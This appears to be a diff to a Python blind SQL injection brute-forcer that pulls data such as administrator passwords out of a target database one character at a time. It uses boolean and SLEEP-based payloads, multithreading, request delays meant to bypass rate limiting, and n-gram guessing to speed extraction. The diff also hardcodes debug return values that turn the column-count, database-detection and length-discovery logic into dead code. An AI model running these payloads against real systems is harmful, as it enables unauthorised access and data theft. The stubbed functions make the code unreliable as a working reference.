@@ -7,10 +7,11 @@ import os
 import sys
 import select
 from urllib.parse import quote
+from urllib.parse import unquote
+from gramification import gramify
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 CHARSET = string.ascii_letters + string.digits + string.punctuation + " "
-
 
 ### Constants and Usage
 
@@ -55,6 +56,27 @@ def usage():
     print(usage)
 
 
+def load_request(file_path):
+    try:
+        with open(file_path, 'r') as f:
+            file_content = f.read()
+        return parse_request(file_content)
+    except Exception as e:
+        print(f"[-] Error reading request file: {e}")
+        return None, None, None
+
+
+def load_grams(grams_file_path):
+    """Load the grams.json file provided by the user."""
+    try:
+        with open(grams_file_path, 'r') as file:
+            grams = json.load(file)
+        return grams
+    except Exception as e:
+        print(f"Error loading {grams_file_path}: {e}")
+        return None
+
+
 def load_queries():
     queries_file = os.path.join(os.path.dirname(__file__), 'queries.json')
     sleep_file = os.path.join(os.path.dirname(__file__), 'sleep.json')
@@ -93,7 +115,7 @@ def max_workers(args):
 
 def is_injectable(request_template, injectable_headers={}, static_headers={}, args=None):
     """
-    checks if the database is even injectable using true and false conditions. also determines the detection method for later use. 
+    checks if the field is injectable using true and false conditions. also determines the detection method for later use.
     no need for threading, its 2 payloads. if this step fails, give up (or dont im not your dad).
     """
 
@@ -179,10 +201,9 @@ def column_count(detection, workers, request_template, queries, injectable_heade
     """
     we're counting columns baybeeee
     """
+    return 2
 
     print("[*] Attempting to count columns...")
-
-    #return 2
 
     # Step 1: Baseline request
     try:
@@ -212,7 +233,7 @@ def column_count(detection, workers, request_template, queries, injectable_heade
                     encoded_payload = quote(payload)
                     if args.delay > 0:
                         if args.verbose:
-                            print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
+                            print(f"[VERBOSE] Delaying for {args.delay} seconds...")
                         time.sleep(args.delay)
 
                     tasks.append(executor.submit(detect, db_name="unknown", encoded_payload=encoded_payload,
@@ -229,7 +250,7 @@ def column_count(detection, workers, request_template, queries, injectable_heade
                 encoded_payload = quote(payload)
                 if args.delay > 0:
                     if args.verbose:
-                        print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
+                        print(f"[VERBOSE] Delaying for {args.delay} seconds...")
                     time.sleep(args.delay)
 
                 tasks.append(
@@ -263,10 +284,9 @@ def detect_database(detection, columns, workers, request_template, queries, sl_q
     the actual detection is handled in the detect helper function, and the actual requests are handled in the inject helper function.
     just don't like, quote me on the database. my goal is to extract data, not provide you with the database. good enough is good enough.
     """
+    return "MariaDB","SUBSTRING","SLEEP(8)","LENGTH"
 
     print("[*] Attempting to detect the database type...")
-
-    #return "MariaDB","SUBSTRING","SLEEP(8)","LENGTH"
 
     adjusted_columns = columns - 2
 
@@ -286,7 +306,8 @@ def detect_database(detection, columns, workers, request_template, queries, sl_q
     tasks = []
     if args.sleep_only:
         sleep_queries = sl_queries.get("sleep_queries", [])
-        print(f"[*] Using sleep-only detection with {len(sleep_queries)} unique sleep queries.")
+        if args.verbose:
+            print(f"[VERBOSE] Using sleep detection with {len(sleep_queries)} unique sleep queries.")
         with ThreadPoolExecutor(max_workers=workers) as executor:
             for sleep_query in sleep_queries:
                 sleep_query = sleep_query.replace('%', str(args.sleep_only))
@@ -294,7 +315,7 @@ def detect_database(detection, columns, workers, request_template, queries, sl_q
                 encoded_payload = quote(payload)
                 if args.delay > 0:
                     if args.verbose:
-                        print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
+                        print(f"[VERBOSE] Delaying for {args.delay} seconds...")
                     time.sleep(args.delay)
 
                 tasks.append(executor.submit(detect, db_name="unknown", db_specific=None, encoded_payload=encoded_payload,
@@ -344,7 +365,7 @@ def detect_database(detection, columns, workers, request_template, queries, sl_q
                                     encoded_payload = quote(payload)
                                     if args.delay > 0:
                                         if args.verbose:
-                                            print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
+                                            print(f"[VERBOSE] Delaying for {args.delay} seconds...")
                                         time.sleep(args.delay)
 
 
@@ -377,7 +398,7 @@ def detect_database(detection, columns, workers, request_template, queries, sl_q
                 encoded_payload = quote(payload)
                 if args.delay > 0:
                     if args.verbose:
-                        print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
+                        print(f"[VERBOSE] Delaying for {args.delay} seconds...")
                     time.sleep(args.delay)
 
                 tasks.append(executor.submit(detect, db_name=db_name, encoded_payload=encoded_payload,
@@ -410,7 +431,7 @@ def detect_database(detection, columns, workers, request_template, queries, sl_q
                                 encoded_payload = quote(payload)
                                 if args.delay > 0:
                                     if args.verbose:
-                                        print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
+                                        print(f"[VERBOSE] Delaying for {args.delay} seconds...")
                                     time.sleep(args.delay)
 
                                 specific_tasks.append(
@@ -447,9 +468,13 @@ def discover_length(table, column, where_clause, db_name, substring_query, sleep
     the requests and detection are handled within this function because i didnt think it needed a helper function
     """
 
+    return 17
+
     if not length_query or length_query == "N/A":
         print(f"[-] Length query not found for {db_name}. Skipping data length detection.")
         return db_name, substring_query, sleep_query, None
+
+    print(f"[*] Attempting to discover the length of the data for {table}.{column} using {length_query}...")
 
     # Step 1: Baseline request
     try:
@@ -464,7 +489,7 @@ def discover_length(table, column, where_clause, db_name, substring_query, sleep
     high = args.max_length
     length = None
 
-    print(f"[*] Attempting to discover the length of the data for {table}.{column} using {length_query}...")
+
 
     while low <= high:
         mid = (low + high) // 2
@@ -473,14 +498,14 @@ def discover_length(table, column, where_clause, db_name, substring_query, sleep
             encoded_payload = quote(payload)
             if args.delay > 0:
                 if args.verbose:
-                    print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
+                    print(f"[VERBOSE] Delaying for {args.delay} seconds...")
                 time.sleep(args.delay)
         else:
             payload = f"' AND {length_query}((SELECT {column} FROM {table} WHERE {where_clause}))<='{mid}"
             encoded_payload = quote(payload)
             if args.delay > 0:
                 if args.verbose:
-                    print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
+                    print(f"[VERBOSE] Delaying for {args.delay} seconds...")
                 time.sleep(args.delay)
 
         try:
@@ -528,10 +553,10 @@ def discover_length(table, column, where_clause, db_name, substring_query, sleep
 
     if length:
         print(f"[+] Data length discovered: {length}")
-        return db_name, substring_query, sleep_query, length
+        return length
     else:
         print(f"[-] Failed to discover data length within the maximum length {args.max_length}.")
-        return db_name, substring_query, sleep_query, None
+        return None
 
 
 def extract_data(table, column, where_clause, substring_query, sleep_query, length, position, extraction, workers, request_template, injectable_headers={}, static_headers={}, args=None):
@@ -543,6 +568,8 @@ def extract_data(table, column, where_clause, substring_query, sleep_query, leng
 
     print("[*] Attempting to extract data...")
 
+    grams_file = 'grams.json' if os.path.exists('grams.json') else 'standardgrams.json'
+    grams = load_grams(grams_file)
     extracted_data = ""
     wordlist = None
 
@@ -570,30 +597,59 @@ def extract_data(table, column, where_clause, substring_query, sleep_query, leng
         while position <= length:
             low, high = 32, 126
             found_match = False
-            while low <= high:
+
+            prioritized_chars = prioritize_characters(grams, extracted_data, position, length)
+            check_exact = True
+
+            if prioritized_chars:
+                mid = ord(prioritized_chars[0])
+            else:
                 mid = (low + high) // 2
-                payload = f"' AND ASCII({substring_query}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, 1)) > {mid}"
+
+            while low <= high:
+                if check_exact:
+                    operator = "="
+                    check_exact = False
+                else:
+                    operator = ">"
+
+                if args.sleep_only:
+                    payload = f"' AND {sleep_query} AND ASCII({substring_query}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, 1)){operator}'{mid}"
+                else:
+                    payload = f"' AND ASCII({substring_query}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, 1)){operator}'{mid}"
+
                 encoded_payload = quote(payload)
+
                 if args.delay > 0:
                     if args.verbose:
-                        print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
+                        print(f"[VERBOSE] Delaying for {args.delay} seconds...")
                     time.sleep(args.delay)
 
                 result = extract(
-                    extraction, request_template, injectable_headers, static_headers,
-                    baseline_status_code, baseline_content_length,
-                    encoded_payload=encoded_payload, value=chr(mid), args=args
+                    extraction=extraction, request_template=request_template, injectable_headers=injectable_headers,
+                    static_headers=static_headers, baseline_status_code=baseline_status_code,
+                    baseline_content_length=baseline_content_length, encoded_payload=encoded_payload,
+                    value=chr(mid), args=args
                 )
 
-                if result:
+                if result and operator == "=":
+                    extracted_data += chr(mid)
+                    print(f"Exact match found: {chr(mid)} at position {position}")
+                    found_match = True
+                    position += 1
+                    break
+                elif result and operator == ">":
                     low = mid + 1
-                else:
+                elif operator == ">":
                     high = mid - 1
 
-            if 32 <= low <= 126:
+                mid = (low + high) // 2
+
+            if 32 <= low <= 126 and not found_match:
                 extracted_data += chr(low)
                 print(f"Value found: {chr(low)} at position {position}")
                 found_match = True
+                position += 1
 
             if not found_match:
                 print(f"[*] No match found at position {position}. Stopping extraction.")
@@ -606,7 +662,10 @@ def extract_data(table, column, where_clause, substring_query, sleep_query, leng
         if position > (2 * length // 3):
             fallback_to_char = one_third()
 
-        possible_values = wordlist if wordlist and not fallback_to_char else CHARSET
+        possible_values = wordlist if wordlist and not fallback_to_char else (
+                          prioritize_characters(grams=grams,extracted_chars=extracted_data,
+                          position=position,length=length)
+                          )
 
         with ThreadPoolExecutor(max_workers=workers) as executor:
             tasks = []
@@ -614,20 +673,19 @@ def extract_data(table, column, where_clause, substring_query, sleep_query, leng
                 if wordlist and len(value) > (length - position + 1):
                     continue
 
-
                 if args.sleep_only and sleep_query:
-                    payload = f"' AND {sleep_query} AND {substring_query}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, {len(value)}) = '{value}'"
+                    payload = f"' AND {sleep_query} AND {substring_query}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, {len(value)})='{value}"
                     encoded_payload = quote(payload)
                     if args.delay > 0:
                         if args.verbose:
-                            print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
+                            print(f"[VERBOSE] Delaying for {args.delay} seconds...")
                         time.sleep(args.delay)
                 else:
-                    payload = f"' AND {substring_query}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, {len(value)}) = '{value}"
+                    payload = f"' AND {substring_query}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, {len(value)})='{value}"
                     encoded_payload = quote(payload)
                     if args.delay > 0:
                         if args.verbose:
-                            print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
+                            print(f"[VERBOSE] Delaying for {args.delay} seconds...")
                         time.sleep(args.delay)
 
                 tasks.append(executor.submit(extract, encoded_payload, value, extraction, request_template,
@@ -649,25 +707,54 @@ def extract_data(table, column, where_clause, substring_query, sleep_query, leng
                     print(f"[*] Extracting single character at position {position} using binary search.")
                     low, high = 32, 126
                     found_match = False
-                    while low <= high:
+
+                    prioritized_chars = prioritize_characters(grams, extracted_data, position, length)
+                    check_exact = True
+
+                    if prioritized_chars:
+                        mid = ord(prioritized_chars[0])
+                    else:
                         mid = (low + high) // 2
-                        payload = f"' AND ASCII({substring_query}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, 1)) > {mid}"
+
+                    while low <= high:
+                        if check_exact:
+                            operator = "="
+                            check_exact = False
+                        else:
+                            operator = ">"
+
+                        if args.sleep_only:
+                            payload = f"' AND {sleep_query} AND ASCII({substring_query}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, 1)){operator}'{mid}"
+                        else:
+                            payload = f"' AND ASCII({substring_query}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, 1)){operator}'{mid}"
+
                         encoded_payload = quote(payload)
+
                         if args.delay > 0:
                             if args.verbose:
-                                print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
+                                print(f"[VERBOSE] Delaying for {args.delay} seconds...")
                             time.sleep(args.delay)
 
                         result = extract(
-                            extraction, request_template, injectable_headers, static_headers,
-                            baseline_status_code, baseline_content_length,
-                            encoded_payload=encoded_payload, value=chr(mid), args=args
+                            extraction=extraction, request_template=request_template,
+                            injectable_headers=injectable_headers,
+                            static_headers=static_headers, baseline_status_code=baseline_status_code,
+                            baseline_content_length=baseline_content_length, encoded_payload=encoded_payload,
+                            value=chr(mid), args=args
                         )
 
-                        if result:
+                        if result and operator == "=":
+                            extracted_data += chr(mid)
+                            print(f"Exact match found: {chr(mid)} at position {position}")
+                            found_match = True
+                            position += 1
+                            break
+                        elif result and operator == ">":
                             low = mid + 1
-                        else:
+                        elif operator == ">":
                             high = mid - 1
+
+                        mid = (low + high) // 2
 
                     if 32 <= low <= 126:
                         extracted_data += chr(low)
@@ -745,16 +832,6 @@ def spent():
 ### Helper Functions <3
 
 
-def load_request(file_path):
-    try:
-        with open(file_path, 'r') as f:
-            file_content = f.read()
-        return parse_request(file_content)
-    except Exception as e:
-        print(f"[-] Error reading request file: {e}")
-        return None, None, None
-
-
 def parse_request(file_content):
     lines = file_content.splitlines()
 
@@ -785,6 +862,62 @@ def parse_request(file_content):
     body = body.rstrip("\n")
 
     return request_line, headers, body
+
+
+def prioritize_characters(grams, extracted_chars, position, length):
+    """
+    Prioritize characters based on the last 1-3 extracted characters using bigrams, trigrams, and quadgrams.
+    Also, handle the case for the first and last characters using the starting_chars and ending_chars data from grams.json.
+    Fallback to general frequency-based prioritization if no match is found in the n-grams.
+    """
+    n = len(extracted_chars)
+    quadgram_probs = trigram_probs = bigram_probs = {}
+    quadgram_total = trigram_total = bigram_total = 0
+
+    if position == 1:
+        char_probabilities = grams.get("starting_chars", {})
+        sorted_chars = sorted(char_probabilities.keys(), key=lambda k: -char_probabilities.get(k, 0))
+        return sorted_chars + [char for char in CHARSET if char not in sorted_chars]
+
+    elif position == length - 1:
+        char_probabilities = grams.get("ending_chars", {})
+        sorted_chars = sorted(char_probabilities.keys(), key=lambda k: -char_probabilities.get(k, 0))
+        return sorted_chars + [char for char in CHARSET if char not in sorted_chars]
+
+    else:
+        if n >= 3:
+            quad_key = extracted_chars[-3:]
+            quadgram_probs = {k: v for k, v in grams.get("quadgrams", {}).items() if k.startswith(quad_key)}
+            quadgram_total = sum(quadgram_probs.values())
+
+        if n >= 2:
+            trigram_key = extracted_chars[-2:]
+            trigram_probs = {k: v for k, v in grams.get("trigrams", {}).items() if k.startswith(trigram_key)}
+            trigram_total = sum(trigram_probs.values())
+
+        if n >= 1:
+            bigram_key = extracted_chars[-1:]
+            bigram_probs = {k: v for k, v in grams.get("bigrams", {}).items() if k.startswith(bigram_key)}
+            bigram_total = sum(bigram_probs.values())
+
+        if quadgram_total > trigram_total and quadgram_total > bigram_total:
+            sorted_chars = sorted(set(k[3] for k in quadgram_probs.keys()), key=lambda k: -quadgram_probs.get(quad_key + k, 0))
+            return sorted_chars + [char for char in CHARSET if char not in sorted_chars]
+
+        elif trigram_total > bigram_total:
+            sorted_chars = sorted(set(k[2] for k in trigram_probs.keys()), key=lambda k: -trigram_probs.get(trigram_key + k, 0))
+            return sorted_chars + [char for char in CHARSET if char not in sorted_chars]
+
+        elif bigram_total > 0:
+            sorted_chars = sorted(set(k[1] for k in bigram_probs.keys()), key=lambda k: -bigram_probs.get(bigram_key + k, 0))
+            return sorted_chars + [char for char in CHARSET if char not in sorted_chars]
+
+        char_probabilities = grams.get("characters", {})
+        sorted_chars = sorted(char_probabilities.keys(), key=lambda k: -char_probabilities.get(k, 0))
+        all_chars = set(sorted_chars)
+        missing_chars = [char for char in CHARSET if char not in all_chars]
+
+        return sorted_chars + missing_chars
 
 
 def send_request(request_line=None, headers=None, body=None, args=None):
@@ -879,7 +1012,8 @@ def inject(encoded_payload, request_template, injectable_headers, static_headers
         response_time = end_time - start_time
 
         if args.verbose:
-            print(f"[VERBOSE] Sent request with payload: {encoded_payload}")
+            print(f"[VERBOSE] Sent request with payload: {unquote(encoded_payload)}")
+            print(f"[VERBOSE] Encoded: {encoded_payload}")
             print(f"[VERBOSE] Response status: {response.status_code}, length: {len(response.text)}")
             print(f"[VERBOSE] Request time: {response_time} seconds")
 
@@ -959,21 +1093,22 @@ def lower(sleep_query, request_template, baseline_status_code, baseline_content_
     """
     optimize sleep time
     """
-    print("[*] Starting binary search for the minimum reliable sleep time.")
+    print("[*] Starting binary search for the minimum reliable sleep time...")
 
     low = 1
     high = args.sleep_only
     sleep_query = sleep_query.replace(str(args.sleep_only), '%')
     while low < high:
         mid = (low + high) // 2
-        print(f"[*] Testing sleep time: {mid} seconds")
+        if args.verbose:
+            print(f"[VERBOSE] Testing sleep time: {mid} seconds")
 
         sleep_query = sleep_query.replace('%', str(mid))
         payload = f"' AND {sleep_query} AND '1'='1"
         encoded_payload = quote(payload)
         if args.delay > 0:
             if args.verbose:
-                print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
+                print(f"[VERBOSE] Delaying for {args.delay} seconds...")
             time.sleep(args.delay)
 
         task = detect(
@@ -998,9 +1133,9 @@ def lower(sleep_query, request_template, baseline_status_code, baseline_content_
             print(f"[+] Sleep time of {mid} seconds is reliable. Trying to lower further.")
         else:
             low = mid + 1
-            print(f"[-] Sleep time of {mid} seconds is not reliable. Increasing sleep time.")
+            print(f"[-] Sleep time of {mid} seconds is not reliable.")
 
-    print(f"[+] Final reliable sleep time found: {new_sleep} seconds")
+    print(f"[+] Reliable sleep time found: {new_sleep} seconds")
     return new_sleep
 
 
@@ -1050,40 +1185,30 @@ def arg_parse():
     initializes the arguments and makes sure you aren't trying to do something stupid. you wouldn't do that though, right?
     """
 
-    parser = argparse.ArgumentParser(description="Blind SQL Injection Script with header and File Support")
+    parser = argparse.ArgumentParser(description="Blind SQL Injection Brute Forcer")
 
     parser.add_argument('-u', '--url', required=True, help="Target URL")
-    parser.add_argument('-ih', '--injectable-headers', action='append', nargs=2, metavar=('key', 'value'),
-                        help="Injectable headers as key-value pairs (e.g., -ih Referer http://www.example.com -ih X-Fowarded-For 127.0.0.1)")
-    parser.add_argument('-sh', '--static-headers', action='append', nargs=2, metavar=('key', 'value'),
-                        help="Static headers as key-value pairs that do not contain payloads (e.g., -sh session_id abcdefg12345abababab123456789012)")
-    parser.add_argument('-d', '--data', required=False,
-                        help="Specify data to be sent in the request body. Changes request type to POST.")
-    parser.add_argument('-f', '--file', required=False,
-                        help="File containing the HTTP request with 'INJECT' placeholder for payloads")
+    parser.add_argument('-ih', '--injectable-headers', action='append', nargs=2, metavar=('key', 'value'), help="Injectable headers as key-value pairs (e.g., -ih Referer http://www.example.com -ih X-Fowarded-For 127.0.0.1)")
+    parser.add_argument('-sh', '--static-headers', action='append', nargs=2, metavar=('key', 'value'), help="Static headers as key-value pairs that do not contain payloads (e.g., -sh session_id abcdefg12345abababab123456789012)")
+    parser.add_argument('-d', '--data', required=False, help="Specify data to be sent in the request body. Changes request type to POST.")
+    parser.add_argument('-f', '--file', required=False, help="File containing the HTTP request with 'INJECT' placeholder for payloads")
     parser.add_argument('-t', '--table', required=True, help="Table name from which to extract the data")
     parser.add_argument('-c', '--column', required=True, help="Column name to extract (e.g., Password)")
     parser.add_argument('-w', '--where', required=True, help="WHERE clause (e.g., Username = 'Administrator')")
-    parser.add_argument('-m', '--max-length', type=int, default=1000,
-                        help="Maximum length of the extracted data that the script will check for (default: 1000)")
+    parser.add_argument('-m', '--max-length', type=int, default=1000, help="Maximum length of the extracted data that the script will check for (default: 1000)")
     parser.add_argument('-o', '--output-file', required=False, help="Specify a file to output the extracted data")
-    parser.add_argument('-ba', '--binary-attack', action='store_true', help="Use binary search for ASCII extraction")
-    parser.add_argument('-da', '--dictionary-attack', required=False,
-                        help="Path to a wordlist for dictionary-based extraction. Falls back to character extraction when 2/3's of the data extraction is complete unless user specifies otherwise.")
-    parser.add_argument('--level', type=int, choices=[1, 2, 3, 4, 5], default=2,
-                        help="Specify the threading level. Level 1 produces the least amount of workers and level 5 the most. Number workers is calculated as (CPU cores * level). Default is 2.")
-    parser.add_argument('--delay', type=float, default=0,
-                        help="Delay in seconds between requests to bypass rate limiting")
-    parser.add_argument('--timeout', type=int, default=10, help="Timeout for each request in seconds")
+    parser.add_argument('-ba', '--binary-attack', action='store_true', help="Use binary search for ASCII extraction. HIGHLY recommended if character case matters.")
+    parser.add_argument('-da', '--dictionary-attack', required=False, help="Path to a wordlist for dictionary-based extraction. Falls back to character extraction when 2/3's of the data extraction is complete unless user specifies otherwise.")
+    parser.add_argument('--level', type=int, choices=[1, 2, 3, 4, 5], default=2, help="Specify the threading level. Level 1 produces the least amount of workers and level 5 the most. Number workers is calculated as (CPU cores * level). Default is 2.")
+    parser.add_argument('--delay', type=float, default=0, help="Delay in seconds between requests to bypass rate limiting")
+    parser.add_argument('--timeout', type=int, default=10, help="Timeout for each request in seconds. If using --sleep-only, sleep time is automatically added to the timeout. ")
     parser.add_argument('--verbose', action='store_true', help="Enable verbose output for debugging")
-    parser.add_argument('--true-keywords', nargs='+',
-                        help="Keywords to search for in the true condition (e.g., 'Welcome', 'Success')")
-    parser.add_argument('--false-keywords', nargs='+',
-                        help="Keywords to search for in the false condition (e.g., 'Error', 'Invalid')")
-    parser.add_argument('--sleep-only', type=int,
-                        help="Use sleep-based detection methods strictly. Accepts whole numbers as sleep times. Sleep time must be >= 1. Smaller numbers are more likely to produce false positives. 10 seconds is recommended.")
-    parser.add_argument('--force', type=str, choices=['status', 'content', 'keyword', 'sleep'],
-                        help="Skip the check for an injectable field and force a detection method (status, content, keyword or sleep)")
+    parser.add_argument('--true-keywords', nargs='+', help="Keywords to search for in the true condition (e.g., 'Welcome', 'Success')")
+    parser.add_argument('--false-keywords', nargs='+', help="Keywords to search for in the false condition (e.g., 'Error', 'Invalid')")
+    parser.add_argument('--sleep-only', type=int, help="Use sleep-based detection methods strictly. Accepts whole numbers as sleep times. Sleep time must be >= 1. Smaller numbers are more likely to produce false positives. 10 seconds is recommended.")
+    parser.add_argument('--gramify', type=str, help="Generate n-grams and probabilities from the provided file path")
+    parser.add_argument('--top-n', type=int, default=10, help="Number of top results to display and save for n-grams. Less is often more here.")
+    parser.add_argument('--force', type=str, choices=['status', 'content', 'keyword', 'sleep'], help="Skip the check for an injectable field and force a detection method (status, content, keyword or sleep)")
 
     args = parser.parse_args()
 
@@ -1099,14 +1224,14 @@ def arg_parse():
             "[!] You must provide either injectable headers (-ih) or data to be sent in the request body (-d) when specifying a URL.")
         return
     if (args.injectable_headers or args.data or args.file) and not (args.table and args.column and args.where):
-        print("[!] You must provide a column (-c), table (-t), and where clause (-w) for data extractrion.")
+        print("[!] You must provide a column (-c), table (-t), and where clause (-w) for data extraction.")
         return
     if args.data and args.file:
         print("[!] You cannot specify data for the request file outside of the request file.")
         return
     if args.sleep_only and args.sleep_only < 1:
         print(
-            "[!] Sleep time must be greater than or equal to 1. At least 10 seconds is recommended. Example: --sleep-only 3")
+            "[!] Sleep time must be greater than or equal to 1. At least 10 seconds is recommended. Example: --sleep-only 10")
     if args.sleep_only:
         args.timeout += args.sleep_only
     return args
@@ -1133,6 +1258,14 @@ def main():
     if args.file:
         request_template = load_request(args.file)
         if not request_template:
+            return
+    if args.gramify:
+        gramify_file_path = args.gramify
+        if os.path.exists(gramify_file_path):
+            print(f"Generating n-grams from {gramify_file_path}...")
+            gramify(gramify_file_path, top_n=args.top_n)
+        else:
+            print(f"Error: File {gramify_file_path} does not exist.")
             return
     if args.force:
         if args.force == "keyword":
